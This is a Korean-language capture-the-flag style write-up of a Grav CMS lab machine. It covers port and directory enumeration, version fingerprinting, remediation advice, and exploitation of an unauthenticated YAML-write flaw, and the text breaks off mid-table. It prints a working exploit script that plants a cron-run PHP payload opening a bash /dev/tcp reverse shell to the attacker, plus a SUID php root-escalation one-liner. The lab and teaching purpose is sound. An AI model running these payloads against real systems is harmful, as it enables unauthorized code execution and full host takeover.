---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/lin/suid
  - tech/lin/cron
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ip: 192.168.115.12
ports: [22, 80]
services: [http, ssh]
cves: [CVE-2021-21425]
status: solved
manual_tags: true
manual_cves: true
tech_count: 3
---

> [!info] 요약
> 타겟 `192.168.115.12` · Ubuntu 20.04 (호스트명 `gravity`) · Fundamental · 플래그 1개
> 진입점: 80 Grav CMS(코어 1.7.8 / Admin 플러그인 1.10.7) — **CVE-2021-21425** 비인증 YAML 쓰기로 `user/config/scheduler.yaml` 에 잡 삽입 → 시스템 크론이 최대 60초 뒤 발화 → `www-data` 리버스셸
> 권한상승: 비표준 SUID `/usr/bin/php7.4` → `php -r 'posix_setuid(0); system("/bin/sh -i");'` → root
> ⚠️ **랩 인스턴스가 둘임.** Target #1 은 2026-06-15 세션(`192.168.115.12`)이고, 2026-08-19 재실행은 `192.168.248.12` 임. 열거·버전 판정 근거 대부분이 재실행 산출물에 있으므로 **블록마다 어느 인스턴스인지 표기**함.
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.115.12

### Initial Access – Grav Admin 플러그인이 인가 검사보다 «앞»에서 YAML 을 저장해, 비인증 요청 하나로 스케줄러 잡이 심기고 시스템 크론이 그것을 실행

**Vulnerability Explanation:** CVE-2021-21425 — Grav Admin 플러그인 ≤1.10.7 의 비인증 임의 YAML 쓰기.
- `POST /admin/config/scheduler` 의 `task=SaveDefault` 가 **인증·인가 확인 전에** `user/config/scheduler.yaml` 을 기록함. 응답은 그 뒤에 인가 실패로 로그인 페이지를 렌더하므로 **응답만 보면 실패로 보임**. 이 세션의 POST 응답 본문·상태코드는 산출물에 남아 있지 않으므로 **응답을 판정 채널로 쓰지 말 것**
- 요청에 필요한 `admin-nonce` 가 **비인증 로그인 페이지 HTML 에 그대로 박혀 있음.** 세션에 바인딩되지 않아 방어가 아니라 공격 재료임
- flat-file CMS 라 `scheduler.yaml` 은 단순 설정이 아니라 **실행할 명령의 정의**임. 임의 쓰기가 곧 코드 실행이 되는 부류(설정 파일 = 실행 정의)
- 발화 주체는 Grav 공식 설치 절차가 등록시키는 **시스템 crontab 의 `bin/grav scheduler`**(매분). 즉 파일 쓰기와 코드 실행 사이에 최대 60초 시차가 있음

**Vulnerability Fix:**
- Admin 플러그인을 **1.10.8 이상**으로 갱신. 코어(1.7.8)만 올려도 이 결함은 남음 — CVE 가 붙은 컴포넌트가 플러그인 쪽임
- 인가 검사를 **라우팅 직후·태스크 디스패치 전**으로 옮길 것. 이 하나만 고쳐도 CVE 전체가 성립하지 않음
- nonce 를 세션에 바인딩하고 단발성으로 만들 것. 로그인 폼 토큰과 관리 태스크 토큰을 분리
- `user/config/` 를 배포 계정 소유로 두고 웹 프로세스의 런타임 쓰기를 차단 — 「설정 쓰기 = 명령 실행」 구조 자체를 끊는 조치
- 프로덕션에서 Whoops 디버그 페이지를 끌 것(`system.errors.display: false`). 스택 프레임·웹루트 절대경로·의존성 버전이 그대로 샘
- Apache 디렉터리 리스팅 해제(`Options -Indexes`). 파일명과 **타임스탬프**가 버전 판정 재료가 됨
- `.htaccess` 의 확장자 화이트리스트를 **디렉터리 전체 거부**(`Require all denied`)로 전환하거나 웹루트를 `public/` 로 분리할 것

**Severity:** Critical — 무인증 원격 코드 실행

**Steps to reproduce the attack:**
1. 리스너 기동 (`rlwrap nc -lnvp 4444`)
2. `GET /grav-admin/admin` 으로 `admin-nonce` 회수
3. `POST /grav-admin/admin/config/scheduler` 에 `task=SaveDefault` + 잡 정의 + `data[status][ncefs]=enabled` 전송
4. 응답은 로그인 페이지 — 판정하지 말고 그대로 대기
5. 최대 60초 뒤 시스템 크론이 스케줄러를 깨워 잡 실행 → `www-data` 셸 도착

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.115.12 (2026-06-15 세션) | TCP: 22, 80 |
| 192.168.248.12 (2026-08-19 재실행) | TCP: 22, 80 |

두 인스턴스의 포트·배너·`grav-admin/` 타임스탬프가 전부 동일함. `-p-` 로도 22/80 둘뿐이라 공격면은 80 하나임 — 22 는 자격증명이 없으면 진입점이 아님.

⚠️ **Target #1 을 `192.168.115.12` 로 잡은 근거** — 이 인스턴스만 foothold·권한상승·플래그가 **스크린샷으로 끝까지 남아 있음**(`파일보관\Pasted image 20260615140619.png` · `20260615153700.png` — 후자는 15:37 에 root 셸에서 `/root/proof.txt` 를 읽은 화면임). 2026-08-19 재실행(`192.168.248.12`)은 열거·버전 판정·익스플로잇 스크립트까지만 산출물이 남고 **셸 이후 증거가 없음**.

2026-06-15 세션의 nmap 원문. ⚠️ 디스크의 `~/PG/Astronaut/nmap.log` 는 2026-08-19 재실행이 같은 경로에 덮어썼으므로, 아래가 이 인스턴스 스캔의 **유일한 잔존 기록**임:

```bash
┌──(kali㉿kali)-[~/PG/Astronaut]
└─$ cat nmap.log
# Nmap 7.98 scan initiated Mon Jun 15 13:10:06 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.115.12
Nmap scan report for 192.168.115.12
Host is up (0.067s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2021-03-17 17:46  grav-admin/
|_
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT      ADDRESS
1   66.79 ms 192.168.45.1
2   66.71 ms 192.168.45.254
3   66.89 ms 192.168.251.1
4   67.02 ms 192.168.115.12

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun 15 13:10:32 2026 -- 1 IP address (1 host up) scanned in 25.84 seconds
```
— 출처: 이 노트의 2026-06-15 원본 기록(git `15671e5`). `nnmap 192.168.115.12` 는 `~/.zsh_history:1029` 에 남아 있음

`nnmap` 은 오타가 아니라 별칭임 — `nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log`. `-oN nmap.log` 가 박혀 있어 **작업 디렉터리를 안 바꾸면 이전 박스 로그를 덮어씀**. 이 박스에서 실제로 그 덮어쓰기가 일어남.

2026-08-19 재실행의 nmap 원문:

```text
# Nmap 7.98 scan initiated Wed Aug 19 18:06:07 2026 as: /usr/lib/nmap/nmap -sCV -p- -Pn -A --min-rate 5000 -oN /home/kali/PG/Astronaut/nmap.log 192.168.248.12
Nmap scan report for 192.168.248.12
Host is up (0.093s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-title: Index of /
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2021-03-17 17:46  grav-admin/
|_
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 23/tcp)
HOP RTT      ADDRESS
1   94.06 ms 192.168.45.1
2   94.03 ms 192.168.45.254
3   92.95 ms 192.168.251.1
4   93.04 ms 192.168.248.12

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Aug 19 18:06:34 2026 -- 1 IP address (1 host up) scanned in 27.01 seconds
```
— 출처: `~/PG/Astronaut/nmap.log`

같은 세션에서 NSE 없이 한 번 더 돌린 것. 결과가 같아 확인 이상의 소득은 없었음:

```text
# Nmap 7.98 scan initiated Wed Aug 19 18:06:38 2026 as: /usr/lib/nmap/nmap -Pn -sS -sV -T4 -p- --min-rate 2000 -oN /home/kali/PG/Astronaut/nmap_full.txt 192.168.248.12
Nmap scan report for 192.168.248.12
Host is up (0.094s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Aug 19 18:07:19 2026 -- 1 IP address (1 host up) scanned in 40.79 seconds
```
— 출처: `~/PG/Astronaut/nmap_full.txt` (root 소유 — `sudo` 로 돌림)

루트가 **디렉터리 리스팅**이고 항목이 `grav-admin/` 하나뿐임. Grav CMS(PHP flat-file CMS) 확정. `http-ls` 가 딸려온 타임스탬프 `2021-03-17 17:46` 이 뒤의 버전 판정 근거 C 가 됨.

디렉터리 리스팅이 켜져 있으면 그 자체가 열거 결과임 — 워드리스트로 맞출 필요가 없고 파일 타임스탬프까지 딸려 나옴.

로그인 페이지:

![[Pasted image 20260615132932.png]]

`/grav-admin/admin` 주소를 feroxbuster 로 확보:

```text
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.115.12/grav-admin
 🚩  In-Scope Url          │ 192.168.115.12
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 👌  Status Codes          │ [200]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      138l      931w    15508c http://192.168.115.12/grav-admin/admin
200      GET      159l     1203w    14014c http://192.168.115.12/grav-admin/home
[####################] - 7m     66153/66153   0s      found:2       errors:28464
[####################] - 2m      4614/4614    37/s    http://192.168.115.12/grav-admin/
[####################] - 2m      4614/4614    31/s    http://192.168.115.12/grav-admin/assets/
[####################] - 3m      4614/4614    31/s    http://192.168.115.12/grav-admin/backup/
[####################] - 3m      4614/4614    29/s    http://192.168.115.12/grav-admin/bin/
[####################] - 3m      4614/4614    30/s    http://192.168.115.12/grav-admin/cache/
[####################] - 3m      4614/4614    28/s    http://192.168.115.12/grav-admin/images/
[####################] - 3m      4614/4614    28/s    http://192.168.115.12/grav-admin/logs/
[####################] - 3m      4614/4614    29/s    http://192.168.115.12/grav-admin/system/
[####################] - 3m      4614/4614    29/s    http://192.168.115.12/grav-admin/tmp/
[####################] - 2m      4614/4614    31/s    http://192.168.115.12/grav-admin/system/images/
[####################] - 2m      4614/4614    32/s    http://192.168.115.12/grav-admin/system/pages/
[####################] - 2m      4614/4614    33/s    http://192.168.115.12/grav-admin/system/templates/
[####################] - 2m      4614/4614    34/s    http://192.168.115.12/grav-admin/system/images/media/
[####################] - 2m      4614/4614    42/s    http://192.168.115.12/grav-admin/system/templates/flex/                                      
```
— 출처: 2026-06-15 원본 기록. 명령은 `~/.zsh_history:1038` 의 `feroxbuster -u http://192.168.115.12:80/grav-admin/ -s 200 -t 200 -w /usr/share/wordlists/dirb/common.txt`

2026-08-19 재실행은 gobuster 로 같은 지점을 훑음:

```text
/# directory-list-2.3-medium.txt (Status: 500) [Size: 218947]
/# Attribution-Share Alike 3.0 License. To view a copy of this.txt (Status: 500) [Size: 219019]
/#.json               (Status: 500) [Size: 218879]
/# This work is licensed under the Creative Commons.json (Status: 500) [Size: 218993]
/# directory-list-2.3-medium.txt.json (Status: 500) [Size: 218945]
/# This work is licensed under the Creative Commons.txt (Status: 500) [Size: 218997]
/# Copyright 2007 James Fisher.txt (Status: 500) [Size: 218959]
/# license, visit http://creativecommons.org/licenses/by-sa/3.0/ (Status: 302) [Size: 0] [--> http://192.168.248.12/grav-admin/%23%20license,%20visit%20http://creativecommons.org/licenses/by-sa/3.0]
/#.txt                (Status: 500) [Size: 218877]
/# Copyright 2007 James Fisher.json (Status: 500) [Size: 218945]
/#.json               (Status: 500) [Size: 218881]
/#.txt                (Status: 500) [Size: 218895]
/# Attribution-Share Alike 3.0 License. To view a copy of this.json (Status: 500) [Size: 219040]
/# directory-list-2.3-medium.txt.txt (Status: 500) [Size: 218945]
/# or send a letter to Creative Commons, 171 Second Street,.txt (Status: 500) [Size: 219013]
/# or send a letter to Creative Commons, 171 Second Street,.json (Status: 500) [Size: 219023]
/# Suite 300, San Francisco, California, 94105, USA..txt (Status: 500) [Size: 219001]
/# Suite 300, San Francisco, California, 94105, USA..json (Status: 500) [Size: 219005]
/#.txt                (Status: 500) [Size: 218895]
/#.json               (Status: 500) [Size: 218884]
/# Priority ordered case sensative list, where entries were found.txt (Status: 500) [Size: 219028]
/# Priority ordered case sensative list, where entries were found.json (Status: 500) [Size: 219042]
/# on atleast 2 different hosts.txt (Status: 500) [Size: 218955]
/# on atleast 2 different hosts.json (Status: 500) [Size: 218951]
/images               (Status: 301) [Size: 328] [--> http://192.168.248.12/grav-admin/images/]
/#.json               (Status: 500) [Size: 218879]
/#.txt                (Status: 500) [Size: 218897]
/home                 (Status: 200) [Size: 14014]
/home.json            (Status: 200) [Size: 14014]
/home.txt             (Status: 200) [Size: 14014]
/login.txt            (Status: 200) [Size: 13967]
/login.json           (Status: 200) [Size: 4122]
/login                (Status: 200) [Size: 13967]
/user                 (Status: 301) [Size: 326] [--> http://192.168.248.12/grav-admin/user/]
/admin.txt            (Status: 403) [Size: 0]
/admin.json           (Status: 403) [Size: 0]
/admin                (Status: 200) [Size: 15508]
/assets               (Status: 301) [Size: 328] [--> http://192.168.248.12/grav-admin/assets/]
/bin                  (Status: 301) [Size: 325] [--> http://192.168.248.12/grav-admin/bin/]
/system               (Status: 301) [Size: 328] [--> http://192.168.248.12/grav-admin/system/]
/README.md            (Status: 403) [Size: 279]
/cache                (Status: 301) [Size: 327] [--> http://192.168.248.12/grav-admin/cache/]
/vendor               (Status: 301) [Size: 328] [--> http://192.168.248.12/grav-admin/vendor/]
/backup               (Status: 301) [Size: 328] [--> http://192.168.248.12/grav-admin/backup/]
/robots.txt           (Status: 200) [Size: 274]
/logs                 (Status: 301) [Size: 326] [--> http://192.168.248.12/grav-admin/logs/]
/forgot_password.json (Status: 200) [Size: 12383]
/forgot_password.txt  (Status: 200) [Size: 12383]
/forgot_password      (Status: 200) [Size: 12383]
/tmp                  (Status: 301) [Size: 325] [--> http://192.168.248.12/grav-admin/tmp/]
/LICENSE.txt          (Status: 403) [Size: 279]
/now.json             (Status: 200) [Size: 72]
```
— 출처: `~/PG/Astronaut/gobuster_grav.log`

⚠️ 같은 세션의 `~/PG/Astronaut/gobuster_root.log` 는 **0바이트**임. 웹루트(`/`)에는 `grav-admin/` 외에 아무것도 없다는 기록이고, 「빈 파일」이 아니라 「빈 응답을 받았다는 기록」임.

이 로그에서 읽히는 것 셋:
- `/admin` 200(15508B) — 관리 로그인. `/admin.txt`·`/admin.json` 은 403 인데 **본문 0바이트**
- `/README.md`·`/LICENSE.txt` 403(279B) — 차단이 경로가 아니라 **파일 단위**로 걸려 있음
- `#` 로 시작하는 항목 다수가 **500**(약 218KB) — 워드리스트(`directory-list-2.3-medium.txt`)의 **주석 줄이 그대로 요청된 것**이고, 그 사고가 Whoops 디버그 페이지를 노출시킴

**정보 유출 ① — Whoops 백트레이스가 비인증으로 통째로 노출됨**

URL 경로에 `#`(=`%23`)가 들어가면 Grav 가 파싱에 실패하며 500 과 함께 218KB 짜리 Whoops 디버그 페이지를 뱉음. 재현:

```bash
curl -s -o err500.html -w 'HTTP=%{http_code} SIZE=%{size_download}\n' \
  'http://192.168.248.12/grav-admin/%23.txt'
```

회수된 페이지에서 예외 종류와 스택 프레임의 파일 경로를 뽑으면:

```text
Undefined index: path
/var/www/html/grav-admin/index.php
/var/www/html/grav-admin/system/src/Grav/Common/Debugger.php
/var/www/html/grav-admin/system/src/Grav/Common/Grav.php
/var/www/html/grav-admin/system/src/Grav/Common/Processors/AssetsProcessor.php
/var/www/html/grav-admin/system/src/Grav/Common/Processors/BackupsProcessor.php
/var/www/html/grav-admin/system/src/Grav/Common/Processors/InitializeProcessor.php
/var/www/html/grav-admin/system/src/Grav/Common/Processors/PagesProcessor.php
/var/www/html/grav-admin/system/src/Grav/Common/Processors/PluginsProcessor.php
/var/www/html/grav-admin/system/src/Grav/Common/Processors/RequestProcessor.php
/var/www/html/grav-admin/system/src/Grav/Common/Processors/SchedulerProcessor.php
/var/www/html/grav-admin/system/src/Grav/Common/Processors/TasksProcessor.php
/var/www/html/grav-admin/system/src/Grav/Common/Processors/ThemesProcessor.php
/var/www/html/grav-admin/system/src/Grav/Common/Processors/TwigProcessor.php
/var/www/html/grav-admin/system/src/Grav/Common/Service/PagesServiceProvider.php
/var/www/html/grav-admin/system/src/Grav/Framework/RequestHandler/Traits/RequestHandlerTrait.php
/var/www/html/grav-admin/vendor/pimple/pimple/src/Pimple/Container.php
```
— 출처: `~/PG/Astronaut/err500.html`(218874바이트)에 `grep -oE 'Undefined index: path|/var/www/html/grav-admin/[^"]+\.php' | sort -u`

**웹루트 절대경로 `/var/www/html/grav-admin` 과 전체 스택 프레임**을 무료로 얻음. `SchedulerProcessor.php` 가 프레임에 있는 것 자체가 스케줄러 파이프라인의 존재를 알려줌.

⚠️ `#` 를 그대로 쓰면 URL 프래그먼트로 잘려 서버에 전송되지 않음 — `%23` 으로 퍼센트 인코딩해야 경로의 일부로 도달함. 같은 계열: `%00`·`%0a`·`%2e%2e%2f`.

⚠️ **Whoops 응답 크기는 요청마다 다름.** 회수된 `err500.html` 은 218874바이트인데 `gobuster_grav.log` 의 `/#.json`·`/#.txt` 응답은 218877~218897 범위임 — 페이지가 요청 URI·타임스탬프를 본문에 박아 넣기 때문. **크기 한 자리를 판정 근거로 삼지 말 것.**

**정보 유출 ② — `.htaccess` 확장자 화이트리스트에 `json` 이 빠져 있음**

Grav 코어 1.7.8 의 `.htaccess` 는 `system/`·`vendor/` 하위를 **확장자 목록**으로 차단함:

```apache
^(system|vendor)/(.*)\.(txt|xml|md|html|yaml|yml|php|pl|py|cgi|twig|sh|bat)$
```
— 출처: 업스트림 `getgrav/grav` 태그 `1.7.8` 의 `.htaccess`(`RewriteRule ^(system|vendor)/(.*)\.(…)$ error [F]`). 타겟에서 이 파일을 직접 읽은 것은 아님

`json` 이 없음. 그래서 같은 디렉터리에서 `.json` 은 그대로 받아짐:

```bash
curl -s -o installed.json -w 'HTTP=%{http_code} SIZE=%{size_download}\n' \
  http://192.168.248.12/grav-admin/vendor/composer/installed.json
```

```text
HTTP=200 SIZE=126903
```
— 출처: `~/PG/Astronaut/installed.json` — 파일 크기가 정확히 126903바이트로 일치함

`installed.json` 에는 **51개 의존 패키지의 버전 + git commit reference** 가 전부 들어 있음.

⚠️ 같은 디렉터리의 `installed.php` 는 위 규칙상 차단 목록(`php`)에 걸리므로 403 일 것 `[가정]` — **이 박스에서 실제로 요청한 산출물은 없음.** 다만 `gobuster_grav.log` 의 `/README.md`·`/LICENSE.txt` 403 이 **파일 단위 차단이 실제로 동작한다**는 것은 보여줌.

**버전 판정 — 코어와 플러그인을 «따로» 판정함**

| 근거 | 출처 | 결론 |
|---|---|---|
| **A. `installed.json` 51개 패키지 대조** | 패키지 메타데이터 | 1.7.8 과 **51/51 일치**. 위아래 릴리스는 각각 불일치 — 아래 표 |
| **B. Apache autoindex 타임스탬프** | 서버 파일시스템 | `grav-admin/ 2021-03-17 17:46` ↔ Grav 1.7.8 릴리스 태그 커밋 `2021-03-17T17:44:48Z`(약 1분 뒤 설치). 서버 TZ 가 UTC 라는 전제 `[가정]` |
| **C. Whoops 스택 프레임** | 런타임 | `Grav.php` 의 `Undefined index: path` — 파일 경로 목록이 1.7.x 계열과 일치. **버전을 좁히지는 못함** |

근거 A 가 단독으로 앞뒤를 다 막음. 업스트림 `composer.lock` 을 직접 대조한 결과:

| 태그 | `donatj/phpuseragentparser` | `filp/whoops` | 타겟 `installed.json` 과 |
|---|---|---|---|
| 1.7.7 | v1.2.0 | 2.9.2 | **불일치** |
| **1.7.8** | **v1.3.0** | **2.9.2** | **일치** |
| 1.7.9 | v1.4.0 | 2.10.0 | **불일치**(2건) |

→ **Grav 코어 1.7.8.**

CVE-2021-21425 는 **플러그인 쪽** 결함이므로 `grav-plugin-admin` 버전을 별도로 확정해야 함. 정적 자산의 콘텐츠 해시를 업스트림 git blob 과 대조:

```bash
ssh kali@10.44.44.128 "cd ~/PG/Astronaut && git hash-object template.css admin.min.js admin_installed.json"
```

```text
47fe3ffb5b7c3c469da35c1d21f41cdef4e6f64d
f7923106b7ba620b2af8189c726744a7080ec285
37706b141c1710f3bf0febbde695d152f31730f9
```
— 출처: `~/PG/Astronaut/` 의 `template.css`(271946B)·`admin.min.js`(515478B)·`admin_installed.json`(9800B). git blob 해시는 `sha1("blob <len>\0" + 내용)` 이라 로컬 `git hash-object` 로 그대로 재계산됨

업스트림 `grav-plugin-admin` 태그 트리의 같은 경로와 대조:

| 경로 | 1.10.6 | 1.10.7 | 1.10.8 | 타겟 |
|---|---|---|---|---|
| `themes/grav/css-compiled/template.css` | `85ee7d63…`(271929B) | `47fe3ffb…`(271946B) | `47fe3ffb…`(271946B) | `47fe3ffb…` |
| `vendor/composer/installed.json` | `aaa40d4d…`(9718B) | `37706b14…`(9800B) | `37706b14…`(9800B) | `37706b14…` |
| `themes/grav/js/admin.min.js` | `f7923106…`(515478B) | `f7923106…`(515478B) | `ebd0f804…`(1898609B) | `f7923106…` |

— 1.10.6·1.10.7 은 `~/PG/Astronaut/tree_1.10.[67].json` 에서, 1.10.8 은 같은 저장소의 태그 트리에서 확인함

**두 축이 서로 반대쪽을 자름 — 이 교차가 판정의 전부임:**
- `template.css` · `admin_installed.json` 은 **1.10.6 을 배제**함. 다만 1.10.7 과 1.10.8 은 이 두 파일이 **동일 blob** 이라 위쪽을 못 가름
- `admin.min.js` 는 반대로 1.10.6·1.10.7 이 동일 blob 이라 아래쪽을 못 가르지만, 1.10.8 에서 blob 이 바뀌므로(515478B → 1898609B) **1.10.8 이상을 배제**함
- 교차하면 남는 것이 **1.10.7 하나**임

⚠️ **한 파일만 보고 「일치하니 그 버전」이라고 하지 말 것.** 릴리스 사이에 안 바뀐 파일은 변별력이 0 임 — 여기서 `template.css` 하나만 봤으면 1.10.8(패치된 버전)도 후보로 남고, 그러면 CVE 판정이 통째로 뒤집힘. **변별력이 있는 파일을 고르는 것이 대조 자체보다 중요함.**

→ **Admin 플러그인 1.10.7** 확정. 익스플로잇이 실제로 통한 것(≤1.10.7 만 해당)이 독립적인 뒷받침임.

> [!danger] 코어 버전과 플러그인 버전은 별개로 판정할 것
> Grav 는 코어(`grav`)와 관리자 플러그인(`grav-plugin-admin`)이 독립 릴리스임. 코어 1.7.8 만 보고 취약/안전을 판단하면 틀림. **CVE 가 어느 컴포넌트에 붙어 있는지 먼저 읽고 그 컴포넌트의 버전을 찾을 것.** 같은 함정: WordPress 코어 vs 플러그인, Jenkins 코어 vs 플러그인, Confluence vs 매크로.

익스플로잇 검색:

```bash
┌──(kali㉿kali)-[~/PG/Astronaut]
└─$ searchsploit grav
-------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                      |  Path
-------------------------------------------------------------------- ---------------------------------
BitDefender GravityZone 5.1.5.386 - Multiple Vulnerabilities        | linux/webapps/34086.txt
Cobian Backup 11 Gravity 11.2.0.582 - 'Password' Denial of Service  | windows/local/50790.py
Cobian Backup Gravity 11.2.0.582 - 'CobianBackup11' Unquoted Servic | windows/local/50791.txt
Grav CMS 1.4.2 Admin Plugin - Cross-Site Scripting                  | php/webapps/42131.txt
Grav CMS 1.6.30 Admin Plugin 1.9.18 - 'Page Title' Persistent Cross | php/webapps/49264.txt
Grav CMS 1.7.10 - Server-Side Template Injection (SSTI) (Authentica | php/webapps/49961.py
Grav CMS 1.7.48 - Remote Code Execution (RCE)                       | php/webapps/52402.txt
GravCMS 1.10.7 - Arbitrary YAML Write/Update (Unauthenticated) (2)  | php/webapps/49973.py
GravCMS 1.10.7 - Unauthenticated Arbitrary File Write (Metasploit)  | php/webapps/49788.rb
```

![[Pasted image 20260615134012.png]]

`GravCMS 1.10.7 - Arbitrary YAML Write/Update (Unauthenticated) (2)` 가 정확히 이 버전을 겨냥함. 같은 결함의 Metasploit 모듈 `49788.rb` 도 있으나 **시험 1대 제한을 소모**하므로 이 난이도 박스에는 쓰지 않음 — 영향 범위 확인용으로 본문을 읽는 것은 제한 대상이 아님.

### Initial Access – 스케줄러 YAML 쓰기 → 크론 RCE

리스너를 먼저 띄움. 이 공격은 응답으로 성패를 알 수 없고 발화까지 최대 60초가 걸리므로, 리스너 없이 던지면 판정 채널 자체가 없음.

```bash
rlwrap nc -lnvp 4444
```
— 출처: `파일보관\Pasted image 20260615140619.png` 의 리스너 화면

`rlwrap` 은 readline 래핑 — 원시 nc 셸에서 ↑ 히스토리·백스페이스·화살표가 먹음. 크론이 낳은 프로세스는 TTY 가 없어 붙는 셸이 raw 상태라 특히 값을 함.

익스플로잇을 내려받음:

```bash
┌──(kali㉿kali)-[~/PG/Astronaut]
└─$ searchsploit -m 49973
  Exploit: GravCMS 1.10.7 - Arbitrary YAML Write/Update (Unauthenticated) (2)
      URL: https://www.exploit-db.com/exploits/49973
     Path: /usr/share/exploitdb/exploits/php/webapps/49973.py
    Codes: N/A
 Verified: True
File Type: ASCII text, with very long lines (429)
Copied to: /home/kali/PG/Astronaut/49973.py
```

받은 스크립트의 `target` 과 페이로드의 LHOST 를 이 세션 값으로 고침. 실제 주소가 `http://192.168.115.12/grav-admin` 이므로 그것으로 수정해야 함:

```bash
┌──(kali㉿kali)-[~/PG/Astronaut]
└─$ cat 49973.py
# Exploit Title: GravCMS 1.10.7 - Arbitrary YAML Write/Update (Unauthenticated) (2)
# Original Exploit Author: Mehmet Ince
# Vendor Homepage: https://getgrav.org
# Version: 1.10.7
# Tested on: Debian 10
# Author: legend

#/usr/bin/python3

import requests
import sys
import re
import base64
target= "http://192.168.115.12/grav-admin"
#Change base64 encoded value with with below command.
#echo -ne "bash -i >& /dev/tcp/192.168.1.3/4444 0>&1" | base64 -w0
payload=b"""/*<?php /**/
file_put_contents('/tmp/rev.sh',base64_decode('YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE3OS80NDQ0IDA+JjE='));chmod('/tmp/rev.sh',0755);system('bash /tmp/rev.sh');
"""
s = requests.Session()
r = s.get(target+"/admin")
adminNonce = re.search(r'admin-nonce" value="(.*)"',r.text).group(1)
if adminNonce != "" :
    url = target + "/admin/tools/scheduler"
    data = "admin-nonce="+adminNonce
    data +='&task=SaveDefault&data%5bcustom_jobs%5d%5bncefs%5d%5bcommand%5d=/usr/bin/php&data%5bcustom_jobs%5d%5bncefs%5d%5bargs%5d=-r%20eval%28base64_decode%28%22'+base64.b64encode(payload).decode('utf-8')+'%22%29%29%3b&data%5bcustom_jobs%5d%5bncefs%5d%5bat%5d=%2a%20%2a%20%2a%20%2a%20%2a&data%5bcustom_jobs%5d%5bncefs%5d%5boutput%5d=&data%5bstatus%5d%5bncefs%5d=enabled&data%5bcustom_jobs%5d%5bncefs%5d%5boutput_mode%5d=append'
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    r = s.post(target+"/admin/config/scheduler",data=data,headers=headers)
```

리버스셸 문자열의 base64 는 따로 만들어 끼워 넣음 — `~/.zsh_history:1088` 의 `echo -ne "bash -i >& /dev/tcp/192.168.45.179/4444 0>&1" | base64 -w0`.

**심어지는 잡:**

```yaml
command: /usr/bin/php
args: '-r eval(base64_decode("<payload>"));'
at: '* * * * *'
status: { ncefs: enabled }
```

| 조각 | 역할 | 빼거나 틀리면 |
|---|---|---|
| `command: /usr/bin/php` | 실행 바이너리. **절대경로** | 스케줄러의 `PATH` 에 의존하게 되어 실패 가능 |
